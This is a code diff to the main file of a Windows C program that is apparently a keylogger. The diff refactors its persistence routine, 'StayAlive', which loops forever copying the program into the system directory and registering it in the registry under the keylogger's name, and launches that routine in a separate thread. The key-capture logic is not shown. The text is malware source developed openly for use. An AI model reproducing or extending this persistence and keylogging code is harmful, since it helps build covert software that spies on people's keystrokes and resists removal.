@@ -1,10 +1,10 @@
 #include "Keylogger.h"
-
-VOID StayAlive();
+#include "..\Tools.h"
+#include "..\Constants.h"
 
 int __cdecl main(int argc, char **argv)
 {
-	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&StayAlive, NULL, 0, NULL);
+	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&StayAlive, KEYLOGGER_APP_NAME, 0, NULL);
 	if (!hThread)
 	{
 		PrintError(TEXT("CreateThread"), GetLastError());
@@ -24,17 +24,10 @@ int __cdecl main(int argc, char **argv)
 	MSG msg = { 0 };
 	while (GetMessage(&msg, NULL, 0u, 0u));
 
-	CloseHandle(hThread);
+	if (!CloseHandle(hThread))
+		PrintError(TEXT("CloseHandle"), GetLastError());
 
 	system("pause");
 	return 0;
 }
 
-VOID StayAlive()
-{
-	while (TRUE)
-	{
-		Copy2Sysdir(KEYLOGGER_APP_NAME);
-		SaveInReg(KEYLOGGER_APP_NAME);
-	}
-}
